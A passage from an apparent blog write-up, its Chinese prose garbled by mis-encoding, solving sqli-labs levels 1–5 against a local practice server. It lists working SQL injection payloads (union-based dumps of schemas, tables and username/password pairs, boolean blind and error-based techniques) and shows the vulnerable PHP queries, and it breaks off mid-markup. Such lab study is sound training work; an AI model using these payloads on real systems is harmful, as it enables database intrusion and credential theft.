title="æ‰‹åŠ¨æ³¨å…¥"></a>æ‰‹åŠ¨æ³¨å…¥</h4><p>è¿›å»ä¹‹åå‘ç°è®©è¾“å…¥idï¼Œéšä¾¿è¾“ä¸€ä¸ªæ•°å­—idå‘ç°éƒ½å¯ä»¥æ­£å¸¸å›æ˜¾ï¼Œç„¶åå°è¯•æ³¨å…¥</p><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8081/sqli-labs/Less-1/?id=1&#x27;</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/05/17/M4r9ztPgwYUuNdL.png" alt="1_1.png"></p><p>æ ¹æ®æŠ¥é”™ä¿¡æ¯çŒœæµ‹åŸè¯­å¥æ˜¯ç”¨<code>&#39;$id&#39;</code>æ¥å¤„ç†çš„è¾“å…¥ï¼Œæ•…ç”¨<code>&#39;</code>é—­åˆå³å¯ã€‚</p><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8081/sqli-labs/Less-1/?id=1&#x27; <span class="attribute">or</span> <span class="number">1</span>=<span class="number">1</span>--+</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/05/17/X1JuzWeRH5GcntV.png" alt="1_2.png"></p><p>æ­£å¸¸å›æ˜¾ï¼Œæ•…ç”¨<code>order by</code>çˆ†å‡ºåˆ—æ•°ï¼Œå‘ç°æœ‰3åˆ—(4æ—¶æŠ¥é”™)</p><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8081/sqli-labs/Less-1/?id=1&#x27; <span class="attribute">order</span> by <span class="number">4</span>--+</span><br></pre></td></tr></table></figure><p>ç„¶åå¼€å§‹çˆ†åº“å</p><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8081/sqli-labs/Less-1/?id=-1&#x27;<span class="attribute">union</span> <span class="literal">select</span> <span class="number">1</span>,group_concat(schema_name),<span class="number">3</span> from information_schema.schemata--+</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/05/17/639kfQjuw8qMStc.png" alt="1_3.png"></p><p>å‘ç°<code>security</code>æ•°æ®åº“ï¼Œå¼€å§‹çˆ†è¡¨å</p><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8081/sqli-labs/Less-1/?id=-1&#x27;<span class="attribute">union</span> <span class="literal">select</span> <span class="number">1</span>,group_concat(table_name),<span class="number">3</span> from information_schema.tables where table_schema=<span class="string">&#x27;security&#x27;</span>--+</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/05/17/YLH869CSsQAWbE5.png" alt="1_4.png"></p><p>çˆ†<code>users</code>è¡¨é‡Œçš„åˆ—å</p><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8081/sqli-labs/Less-1/?id=-1&#x27;<span class="attribute">union</span> <span class="literal">select</span> <span class="number">1</span>,group_concat(column_name),<span class="number">3</span> from information_schema.columns where table_name=<span class="string">&#x27;users&#x27;</span>--+</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/05/17/fbgWAv5Ir68DTdY.png" alt="1_5.png"></p><p>çˆ†å‡ºè¡¨é‡Œçš„æ‰€æœ‰æ•°æ®</p><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8081/sqli-labs/Less-1/?id=-1&#x27;<span class="attribute">union</span> <span class="literal">select</span> <span class="number">1</span>,<span class="number">2</span>,group_concat(username,0x3a,password) from users--+</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/05/17/Uc5l39PbvWEoXCG.png" alt="1_6.png"></p><p>å¾ˆå¥½ï¼Œæˆ‘ä»¬ç»ˆäºè¾¾åˆ°äº†å’Œä¸æ–­ç›´æ¥è¾“å…¥<code>?id=xxxxx</code>ç›¸åŒçš„æ•ˆæœhhhğŸ˜„</p><h4 id="æºç åˆ†æ"><a href="#æºç åˆ†æ" class="headerlink" title="æºç åˆ†æ"></a>æºç åˆ†æ</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE id=&#x27;<span class="subst">$id</span>&#x27; LIMIT 0,1&quot;</span>;</span><br></pre></td></tr></table></figure><p>æŠŠä¼ å…¥çš„<code>$id</code>ç›´æ¥å½“ä½œå­—ç¬¦ä¸²æ‹¼æ¥äº†è¿›æ¥ï¼Œæ•…åªéœ€è¦ç”¨<code>&#39;</code>é—­åˆæ‰å‰é¢çš„å¼•å·ï¼Œç„¶åç”¨<code>--+</code>æ³¨é‡Šæ‰åé¢çš„è¯­å¥å³å¯å®Œæˆæ³¨å…¥</p><h3 id="Less-2-GET-Error-based-Intiger-based-åŸºäºé”™è¯¯çš„GETæ•´å‹æ³¨å…¥"><a href="#Less-2-GET-Error-based-Intiger-based-åŸºäºé”™è¯¯çš„GETæ•´å‹æ³¨å…¥" class="headerlink" title="Less-2 GET - Error based - Intiger based (åŸºäºé”™è¯¯çš„GETæ•´å‹æ³¨å…¥)"></a>Less-2 GET - Error based - Intiger based (åŸºäºé”™è¯¯çš„GETæ•´å‹æ³¨å…¥)</h3><h4 id="æ‰‹åŠ¨æ³¨å…¥-1"><a href="#æ‰‹åŠ¨æ³¨å…¥-1" class="headerlink" title="æ‰‹åŠ¨æ³¨å…¥"></a>æ‰‹åŠ¨æ³¨å…¥</h4><p>è¾“å…¥<code>?id=1&#39;</code>è§‚å¯ŸæŠ¥é”™</p><p><img src="https://s2.loli.net/2022/05/17/6cSxRIwZXdgPE1r.png" alt="2.png"></p><p>æ ¹æ®æŠ¥é”™çŒœæµ‹æ˜¯æœªç”¨<code>&#39;&#39;</code>åŒ…è£¹<code>$id</code>ï¼Œç›´æ¥å¯¹è¾“å…¥è¿›è¡Œæ‹¼æ¥ï¼Œæ•…ä¸less-1ç›¸æ¯”åªéœ€å»æ‰æ•°å­—åçš„<code>&#39;</code>å³å¯ã€‚</p><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="comment">#å°è¯•</span></span><br><span class="line">http://127.0.0.1:8081/sqli-labs/Less-2/?id=1 <span class="attribute">or</span> <span class="number">1</span>=<span class="number">1</span>--+</span><br><span class="line"><span class="comment">#çˆ†åˆ—æ•°</span></span><br><span class="line">http://127.0.0.1:8081/sqli-labs/Less-2/?id=1 order by <span class="number">1</span>--+</span><br><span class="line">http://127.0.0.1:8081/sqli-labs/Less-2/?id=1 order by <span class="number">2</span>--+</span><br><span class="line">http://127.0.0.1:8081/sqli-labs/Less-2/?id=1 order by <span class="number">3</span>--+</span><br><span class="line">http://127.0.0.1:8081/sqli-labs/Less-2/?id=1 order by <span class="number">4</span>--+</span><br><span class="line"><span class="comment">#çˆ†åº“å</span></span><br><span class="line">http://127.0.0.1:8081/sqli-labs/Less-2/?id=-1 union <span class="literal">select</span> <span class="number">1</span>,group_concat(schema_name),<span class="number">3</span> from information_schema.schemata--+</span><br><span class="line"><span class="comment">#çˆ†è¡¨å</span></span><br><span class="line">http://127.0.0.1:8081/sqli-labs/Less-2/?id=-1 union <span class="literal">select</span> <span class="number">1</span>,group_concat(table_name),<span class="number">3</span> from information_schema.tables where table_schema=<span class="string">&#x27;security&#x27;</span>--+</span><br><span class="line"><span class="comment">#çˆ†åˆ—å</span></span><br><span class="line">http://127.0.0.1:8081/sqli-labs/Less-2/?id=-1 union <span class="literal">select</span> <span class="number">1</span>,group_concat(column_name),<span class="number">3</span> from information_schema.columns where table_name=<span class="string">&#x27;users&#x27;</span>--+</span><br><span class="line"><span class="comment">#çˆ†æ•°æ®</span></span><br><span class="line">http://127.0.0.1:8081/sqli-labs/Less-2/?id=-1 union <span class="literal">select</span> <span class="number">1</span>,<span class="number">2</span>,group_concat(username,0x3a,password) from users--+</span><br></pre></td></tr></table></figure><h4 id="æºç åˆ†æ-1"><a href="#æºç åˆ†æ-1" class="headerlink" title="æºç åˆ†æ"></a>æºç åˆ†æ</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE id=<span class="subst">$id</span> LIMIT 0,1&quot;</span>;</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°ç›´æ¥æŠŠ<code>$id</code>æ‹¼æ¥äº†è¿›æ¥ã€‚</p><h3 id="Less-3-GET-Error-based-Single-quotes-with-twist-string-åŸºäºé”™è¯¯çš„GETå•å¼•å·å˜å½¢å­—ç¬¦å‹æ³¨å…¥"><a href="#Less-3-GET-Error-based-Single-quotes-with-twist-string-åŸºäºé”™è¯¯çš„GETå•å¼•å·å˜å½¢å­—ç¬¦å‹æ³¨å…¥" class="headerlink" title="Less-3 GET - Error based - Single quotes with twist string (åŸºäºé”™è¯¯çš„GETå•å¼•å·å˜å½¢å­—ç¬¦å‹æ³¨å…¥)"></a>Less-3 GET - Error based - Single quotes with twist string (åŸºäºé”™è¯¯çš„GETå•å¼•å·å˜å½¢å­—ç¬¦å‹æ³¨å…¥)</h3><h4 id="æ‰‹åŠ¨æ³¨å…¥-2"><a href="#æ‰‹åŠ¨æ³¨å…¥-2" class="headerlink" title="æ‰‹åŠ¨æ³¨å…¥"></a>æ‰‹åŠ¨æ³¨å…¥</h4><p>è¾“å…¥<code>?id=1&#39;</code>è§‚å¯ŸæŠ¥é”™</p><p><img src="https://s2.loli.net/2022/05/17/SefyJM3Dud15Pk6.png" alt="3.png"></p><p>æ ¹æ®æŠ¥é”™çŒœæµ‹åŸè¯­å¥æ˜¯<code>(&#39;$id&#39;)</code>ï¼Œæ•…åªéœ€ç”¨<code>&#39;)</code>æ¥é—­åˆå³å¯ã€‚</p><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="comment">#å°è¯•</span></span><br><span class="line">http://127.0.0.1:8081/sqli-labs/Less-3/?id=1&#x27;)--+</span><br><span class="line"><span class="comment">#çˆ†åˆ—æ•°</span></span><br><span class="line">http://127.0.0.1:8081/sqli-labs/Less-3/?id=1&#x27;)<span class="attribute">order</span> by <span class="number">1</span>--+</span><br><span class="line">http://127.0.0.1:8081/sqli-labs/Less-3/?id=1&#x27;)order by <span class="number">2</span>--+</span><br><span class="line">http://127.0.0.1:8081/sqli-labs/Less-3/?id=1&#x27;)order by <span class="number">3</span>--+</span><br><span class="line">http://127.0.0.1:8081/sqli-labs/Less-3/?id=1&#x27;)order by <span class="number">4</span>--+</span><br><span class="line"><span class="comment">#çˆ†åº“å</span></span><br><span class="line">http://127.0.0.1:8081/sqli-labs/Less-3/?id=-1&#x27;)union <span class="literal">select</span> <span class="number">1</span>,group_concat(schema_name),<span class="number">3</span> from information_schema.schemata--+</span><br><span class="line"><span class="comment">#çˆ†è¡¨å</span></span><br><span class="line">http://127.0.0.1:8081/sqli-labs/Less-3/?id=-1&#x27;)union <span class="literal">select</span> <span class="number">1</span>,group_concat(table_name),<span class="number">3</span> from information_schema.tables where table_schema=<span class="string">&#x27;security&#x27;</span>--+</span><br><span class="line"><span class="comment">#çˆ†åˆ—å</span></span><br><span class="line">http://127.0.0.1:8081/sqli-labs/Less-3/?id=-1&#x27;)union <span class="literal">select</span> <span class="number">1</span>,group_concat(column_name),<span class="number">3</span> from information_schema.columns where table_name=<span class="string">&#x27;users&#x27;</span>--+</span><br><span class="line"><span class="comment">#çˆ†æ•°æ®</span></span><br><span class="line">http://127.0.0.1:8081/sqli-labs/Less-3/?id=-1&#x27;)union <span class="literal">select</span> <span class="number">1</span>,<span class="number">2</span>,group_concat(username,0x3a,password) from users--+</span><br></pre></td></tr></table></figure><h4 id="æºç åˆ†æ-2"><a href="#æºç åˆ†æ-2" class="headerlink" title="æºç åˆ†æ"></a>æºç åˆ†æ</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE id=(&#x27;<span class="subst">$id</span>&#x27;) LIMIT 0,1&quot;</span>;</span><br></pre></td></tr></table></figure><h3 id="Less-4-GET-Error-based-Double-Quotes-String-åŸºäºé”™è¯¯çš„GETåŒå¼•å·å­—ç¬¦å‹æ³¨å…¥"><a href="#Less-4-GET-Error-based-Double-Quotes-String-åŸºäºé”™è¯¯çš„GETåŒå¼•å·å­—ç¬¦å‹æ³¨å…¥" class="headerlink" title="Less-4 GET - Error based - Double Quotes - String (åŸºäºé”™è¯¯çš„GETåŒå¼•å·å­—ç¬¦å‹æ³¨å…¥)"></a>Less-4 GET - Error based - Double Quotes - String (åŸºäºé”™è¯¯çš„GETåŒå¼•å·å­—ç¬¦å‹æ³¨å…¥)</h3><h4 id="æ‰‹åŠ¨æ³¨å…¥-3"><a href="#æ‰‹åŠ¨æ³¨å…¥-3" class="headerlink" title="æ‰‹åŠ¨æ³¨å…¥"></a>æ‰‹åŠ¨æ³¨å…¥</h4><p>è¿˜æ˜¯è¾“å…¥<code>?id=1&#39;</code>ï¼Œå‘ç°èƒ½æ­£å¸¸æ˜¾ç¤ºï¼Œæ•…ä½¿ç”¨<code>?id=1&quot;</code>è¿›è¡Œå°è¯•</p><p><img src="https://s2.loli.net/2022/05/17/b7qLRYUfVed6hnW.png" alt="4.png"></p><p>æ ¹æ®æŠ¥é”™çŒœæµ‹åŸè¯­å¥æ˜¯<code>(&quot;$id&quot;)</code>ï¼Œæ•…åªéœ€ç”¨<code>&quot;)</code>æ¥é—­åˆå³å¯ã€‚</p><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="comment">#å°è¯•</span></span><br><span class="line">http://127.0.0.1:8081/sqli-labs/Less-4/?id=1&quot;)--+</span><br><span class="line"><span class="comment">#çˆ†åˆ—æ•°</span></span><br><span class="line">http://127.0.0.1:8081/sqli-labs/Less-4/?id=1&quot;)<span class="attribute">order</span> by <span class="number">1</span>--+</span><br><span class="line">http://127.0.0.1:8081/sqli-labs/Less-4/?id=1&quot;)order by <span class="number">2</span>--+</span><br><span class="line">http://127.0.0.1:8081/sqli-labs/Less-4/?id=1&quot;)order by <span class="number">3</span>--+</span><br><span class="line">http://127.0.0.1:8081/sqli-labs/Less-4/?id=1&quot;)order by <span class="number">4</span>--+</span><br><span class="line"><span class="comment">#çˆ†åº“å</span></span><br><span class="line">http://127.0.0.1:8081/sqli-labs/Less-4/?id=-1&quot;)union <span class="literal">select</span> <span class="number">1</span>,group_concat(schema_name),<span class="number">3</span> from information_schema.schemata--+</span><br><span class="line"><span class="comment">#çˆ†è¡¨å</span></span><br><span class="line">http://127.0.0.1:8081/sqli-labs/Less-4/?id=-1&quot;)union <span class="literal">select</span> <span class="number">1</span>,group_concat(table_name),<span class="number">3</span> from information_schema.tables where table_schema=<span class="string">&#x27;security&#x27;</span>--+</span><br><span class="line"><span class="comment">#çˆ†åˆ—å</span></span><br><span class="line">http://127.0.0.1:8081/sqli-labs/Less-4/?id=-1&quot;)union <span class="literal">select</span> <span class="number">1</span>,group_concat(column_name),<span class="number">3</span> from information_schema.columns where table_name=<span class="string">&#x27;users&#x27;</span>--+</span><br><span class="line"><span class="comment">#çˆ†æ•°æ®</span></span><br><span class="line">http://127.0.0.1:8081/sqli-labs/Less-4/?id=-1&quot;)union <span class="literal">select</span> <span class="number">1</span>,<span class="number">2</span>,group_concat(username,0x3a,password) from users--+</span><br></pre></td></tr></table></figure><h4 id="æºç åˆ†æ-3"><a href="#æºç åˆ†æ-3" class="headerlink" title="æºç åˆ†æ"></a>æºç åˆ†æ</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$id</span> = <span class="string">&#x27;&quot;&#x27;</span> . <span class="variable">$id</span> . <span class="string">&#x27;&quot;&#x27;</span>;</span><br><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE id=(<span class="subst">$id</span>) LIMIT 0,1&quot;</span>;</span><br></pre></td></tr></table></figure><h3 id="Less-5-GET-Double-Injection-Single-Quotes-String-åŒæ³¨å…¥GETå•å¼•å·å­—ç¬¦å‹æ³¨å…¥"><a href="#Less-5-GET-Double-Injection-Single-Quotes-String-åŒæ³¨å…¥GETå•å¼•å·å­—ç¬¦å‹æ³¨å…¥" class="headerlink" title="Less-5 GET - Double Injection - Single Quotes - String (åŒæ³¨å…¥GETå•å¼•å·å­—ç¬¦å‹æ³¨å…¥)"></a>Less-5 GET - Double Injection - Single Quotes - String (åŒæ³¨å…¥GETå•å¼•å·å­—ç¬¦å‹æ³¨å…¥)</h3><h4 id="æºç åˆ†æ-4"><a href="#æºç åˆ†æ-4" class="headerlink" title="æºç åˆ†æ"></a>æºç åˆ†æ</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE id=&#x27;<span class="subst">$id</span>&#x27; LIMIT 0,1&quot;</span>;</span><br><span class="line"><span class="variable">$result</span>=<span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$con1</span>, <span class="variable">$sql</span>);</span><br><span class="line"><span class="variable">$row</span> = <span class="title function_ invoke__">mysqli_fetch_array</span>(<span class="variable">$result</span>, MYSQLI_BOTH);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$row</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&#x27;&lt;font size=&quot;5&quot; color=&quot;#FFFF00&quot;&gt;&#x27;</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&#x27;You are in...........&#x27;</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="keyword">else</span> </span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;font size=&quot;3&quot; color=&quot;#FFFF00&quot;&gt;&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">mysqli_error</span>(<span class="variable">$con1</span>));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&lt;/font&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;font color= &quot;#0000ff&quot; font size= 3&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¸less-1ä¸€æ ·ç”¨<code>&#39;&#39;</code>å¯¹è¾“å…¥è¿›è¡Œå¤„ç†æ¥æ‹¼æ¥ï¼Œä¸åŒçš„æ˜¯è¾“å…¥æ­£ç¡®åä¸åœ¨æ˜¾ç¤ºæ•°æ®åº“ä¿¡æ¯ï¼Œè€ŒæŠ¥é”™ä¿¡æ¯å´èƒ½æ­£ç¡®å›æ˜¾ï¼Œæ­¤å¤„å°†ä½¿ç”¨å¤šç§æ–¹å¼å®Œæˆæ³¨å…¥ï¼Œä»¥é€šè¿‡æ­¤å…³æ¥å­¦ä¹ å„ç§æ³¨å…¥æ–¹æ³•åŠå‡½æ•°åˆ©ç”¨ã€‚</p><h4 id="å¸ƒå°”ç›²æ³¨"><a href="#å¸ƒå°”ç›²æ³¨" class="headerlink" title="å¸ƒå°”ç›²æ³¨"></a>å¸ƒå°”ç›²æ³¨</h4><h5 id="åˆ©ç”¨left-å’Œlength-å‡½æ•°è·å–ç‰ˆæœ¬å·åŠåº“å"><a href="#åˆ©ç”¨left-å’Œlength-å‡½æ•°è·å–ç‰ˆæœ¬å·åŠåº“å" class="headerlink" title="åˆ©ç”¨left()å’Œlength()å‡½æ•°è·å–ç‰ˆæœ¬å·åŠåº“å"></a>åˆ©ç”¨left()å’Œlength()å‡½æ•°è·å–ç‰ˆæœ¬å·åŠåº“å</h5><p>é€ä½è¿›è¡Œå­—ç¬¦å¯¹æ¯”ï¼Œå¦‚æœæ­£ç¡®åˆ™èƒ½çœ‹åˆ°<code>You are in...........</code>æ­£ç¡®æ˜¾ç¤ºï¼Œå¦åˆ™ä¸èƒ½ã€‚</p><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="comment">#çˆ†ç‰ˆæœ¬å·ï¼Œæˆ‘çš„æ•°æ®åº“ç‰ˆæœ¬æ˜¯10.4.11-MariaDB</span></span><br><span class="line">http://127.0.0.1:8081/sqli-labs/Less-5/?id=1&#x27;<span class="attribute">and</span> left(version(),<span class="number">1</span>)=<span class="number">1</span>--+</span><br><span class="line">http://127.0.0.1:8081/sqli-labs/Less-5/?id=1&#x27;and left(version(),<span class="number">2</span>)=<span class="number">10</span>--+</span><br><span class="line">http://127.0.0.1:8081/sqli-labs/Less-5/?id=1&#x27;and left(version(),<span class="number">15</span>)=<span class="string">&#x27;10.4.11-MariaDB&#x27;</span>--+</span><br><span class="line"><span class="comment">#çˆ†åº“é•¿</span></span><br><span class="line">http://127.0.0.1:8081/sqli-labs/Less-5/?id=1&#x27;and length(database())=<span class="number">8</span>--+</span><br><span class="line"><span class="comment">#çˆ†åº“åï¼Œä½¿ç”¨çš„æ•°æ®åº“åç§°ä¸ºsecurityï¼Œå…ˆçœ‹ç¬¬ä¸€ä½æ˜¯ä¸æ˜¯å¤§äºa,ç„¶åé€ä½å°è¯•</span></span><br><span class="line">http://127.0.0.1:8081/sqli-labs/Less-5/?id=1&#x27;and left(database(),<span class="number">1</span>)&gt;<span class="string">&#x27;a&#x27;</span>--+</span><br><span class="line">http://127.0.0.1:8081/sqli-labs/Less-5/?id=1&#x27;and left(database(),<span class="number">8</span>)=<span class="string">&#x27;security&#x27;</span>--+</span><br></pre></td></tr></table></figure><h5 id="åˆ©ç”¨substr-å’Œascii-å‡½æ•°è·å–è¡¨å"><a href="#åˆ©ç”¨substr-å’Œascii-å‡½æ•°è·å–è¡¨å" class="headerlink" title="åˆ©ç”¨substr()å’Œascii()å‡½æ•°è·å–è¡¨å"></a>åˆ©ç”¨substr()å’Œascii()å‡½æ•°è·å–è¡¨å</h5><p>é€ä½å¯¹æ¯”ï¼Œå¦‚æœæ­£ç¡®åˆ™èƒ½çœ‹åˆ°<code>You are in...........</code>æ­£ç¡®æ˜¾ç¤ºï¼Œå¦åˆ™ä¸èƒ½ã€‚</p><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="comment">#çˆ†è¡¨åï¼Œè¿™é‡Œç¬¬ä¸€ä¸ªè¡¨æ˜¯emailsï¼Œä½¿ç”¨çš„æ•°æ®åº“æ˜¯security</span></span><br><span class="line">http://127.0.0.1:8081/sqli-labs/Less-5/?id=1&#x27;<span class="attribute">and</span> ascii(substr((<span class="literal">select</span> table_name from information_schema.tables where table_schema=database() limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>))&gt;<span class="number">80</span>--+</span><br><span class="line">http://127.0.0.1:8081/sqli-labs/Less-5/?id=1&#x27;and ascii(substr((<span class="literal">select</span> table_name from information_schema.tables where table_schema=database() limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>))=<span class="number">101</span>--+</span><br><span class="line">http://127.0.0.1:8081/sqli-labs/Less-5/?id=1&#x27;and ascii(substr((<span class="literal">select</span> table_name from information_schema.tables where table_schema=database() limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">2</span>,<span class="number">1</span>))=<span class="number">109</span>--+</span><br><span class="line"></span><br><span class="line"><span class="comment">#çˆ†å‡ºç¬¬ä¸€ä¸ªå­—ç¬¦åæŒ¨ä¸ªçˆ†ç ´å‰©ä½™å­—ç¬¦ï¼Œæœ€åè·å–ç¬¬ä¸€ä¸ªè¡¨åï¼Œå¦‚æœæƒ³è·å–ç¬¬äºŒä¸ªï¼Œåªéœ€è¦ä¿®æ”¹limitåçš„å†…å®¹å³å¯</span></span><br><span class="line">http://127.0.0.1:8081/sqli-labs/Less-5/?id=1&#x27;and ascii(substr((<span class="literal">select</span> table_name from information_schema.tables where table_schema=database() limit <span class="number">1</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>))=<span class="number">114</span>--+</span><br></pre></td></tr></table></figure><h5 id="åˆ©ç”¨regexp-å‡½æ•°è·å–åˆ—åå­—"><a href="#åˆ©ç”¨regexp-å‡½æ•°è·å–åˆ—åå­—" class="headerlink" title="åˆ©ç”¨regexp()å‡½æ•°è·å–åˆ—åå­—"></a>åˆ©ç”¨regexp()å‡½æ•°è·å–åˆ—åå­—</h5><p>æ­£åˆ™åŒ¹é…ï¼Œå¦‚æœæ­£ç¡®åˆ™èƒ½çœ‹åˆ°<code>You are in...........</code>æ­£ç¡®æ˜¾ç¤ºï¼Œå¦åˆ™ä¸èƒ½ã€‚</p><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="comment">#çœ‹usersä¸­æ˜¯å¦æœ‰ä»¥uså¼€å¤´çš„åˆ—å</span></span><br><span class="line">http://127.0.0.1:8081/sqli-labs/Less-5/?id=1&#x27;<span class="attribute">and</span> <span class="number">1</span>=(<span class="literal">select</span> <span class="number">1</span> from information_schema.columns where table_name=<span class="string">&#x27;users&#x27;</span> and column_name regexp <span class="string">&#x27;^us[a-z]&#x27;</span> limit <span class="number">0</span>,<span class="number">1</span>)--+</span><br><span class="line"><span class="comment">#çœ‹usersä¸­æ˜¯å¦æœ‰ä»¥passå¼€å¤´çš„åˆ—å</span></span><br><span class="line">http://127.0.0.1:8081/sqli-labs/Less-5/?id=1&#x27;and <span class="number">1</span>=(<span class="literal">select</span> <span class="number">1</span> from information_schema.columns where table_name=<span class="string">&#x27;users&#x27;</span> and column_name regexp <span class="string">&#x27;^pass[a-z]&#x27;</span> limit <span class="number">0</span>,<span class="number">1</span>)--+</span><br></pre></td></tr></table></figure><h5 id="åˆ©ç”¨ord-å’Œmid-å‡½æ•°è·å–users-è¡¨çš„å†…å®¹"><a href="#åˆ©ç”¨ord-å’Œmid-å‡½æ•°è·å–users-è¡¨çš„å†…å®¹" class="headerlink" title="åˆ©ç”¨ord()å’Œmid()å‡½æ•°è·å–users è¡¨çš„å†…å®¹"></a>åˆ©ç”¨ord()å’Œmid()å‡½æ•°è·å–users è¡¨çš„å†…å®¹</h5><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="comment">#ç¬¬ä¸€ä¸ªç”¨æˆ·åä¸ºDumbï¼Œæ­¤è¯­å¥æ˜¯çœ‹ç¬¬ä¸€ä¸ªç”¨æˆ·åçš„ç¬¬ä¸€ä¸ªå­—ç¬¦æ˜¯å¦ä¸ºD</span></span><br><span class="line">http://127.0.0.1:8081/sqli-labs/Less-5/?id=1&#x27; <span class="attribute">and</span> ORD(MID((SELECT IFNULL(CAST(username AS CHAR),0x20)FROM security.users ORDER BY id LIMIT <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>))=<span class="number">68</span>--+</span><br></pre></td></tr></table></figure><h4 id="æŠ¥é”™æ³¨å…¥"><a href="#æŠ¥é”™æ³¨å…¥" class="headerlink" title="æŠ¥é”™æ³¨å…¥"></a>æŠ¥é”™æ³¨å…¥</h4><blockquote><p><a href="https://www.cnblogs.com/JxSir/articles/15183838.html">MySQL ERROR 1267 (HY000)é”™è¯¯è§£å†³åŠæ³•</a></p></blockquote><h5 id="åˆ©ç”¨floor-rand-0-2-è¿›è¡ŒæŠ¥é”™æ³¨å…¥"><a href="#åˆ©ç”¨floor-rand-0-2-è¿›è¡ŒæŠ¥é”™æ³¨å…¥" class="headerlink" title="åˆ©ç”¨floor(rand(0)*2)è¿›è¡ŒæŠ¥é”™æ³¨å…¥"></a>åˆ©ç”¨floor(rand(0)*2)è¿›è¡ŒæŠ¥é”™æ³¨å…¥</h5><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8081/sqli-labs/Less-5/?id=-1&#x27;<span class="attribute">union</span> <span class="literal">select</span> <span class="number">1</span>,count(*),concat(0x3a,0x3a,(<span class="literal">select</span> user()),0x3a,0x3a,floor(rand(<span class="number">0</span>)*<span class="number">2</span>))a from information_schema.columns  group by a--+</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/05/17/jVI2pOsYowrS3e9.png" alt="5_1.png"></p><h5 id="åˆ©ç”¨-double-æ•°å€¼ç±»å‹è¶…å‡ºèŒƒå›´è¿›è¡ŒæŠ¥é”™æ³¨å…¥"><a href="#åˆ©ç”¨-double-æ•°å€¼ç±»å‹è¶…å‡ºèŒƒå›´è¿›è¡ŒæŠ¥é”™æ³¨å…¥" class="headerlink" title="åˆ©ç”¨ double æ•°å€¼ç±»å‹è¶…å‡ºèŒƒå›´è¿›è¡ŒæŠ¥é”™æ³¨å…¥"></a>åˆ©ç”¨ double æ•°å€¼ç±»å‹è¶…å‡ºèŒƒå›´è¿›è¡ŒæŠ¥é”™æ³¨å…¥</h5><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8081/sqli-labs/Less-5/?id=1&#x27;<span class="attribute">union</span> <span class="literal">select</span> (exp(~(<span class="literal">select</span> * FROM(SELECT USER())a))),<span class="number">2</span>,<span class="number">3</span>--+</span><br></pre></td></tr></table></figure><h5 id="åˆ©ç”¨-bigint-æº¢å‡ºè¿›è¡ŒæŠ¥é”™æ³¨å…¥"><a href="#åˆ©ç”¨-bigint-æº¢å‡ºè¿›è¡ŒæŠ¥é”™æ³¨å…¥" class="headerlink" title="åˆ©ç”¨ bigint æº¢å‡ºè¿›è¡ŒæŠ¥é”™æ³¨å…¥"></a>åˆ©ç”¨ bigint æº¢å‡ºè¿›è¡ŒæŠ¥é”™æ³¨å…¥</h5><figure class="highlight nginx"><table><tr><td class="code"><pre><span 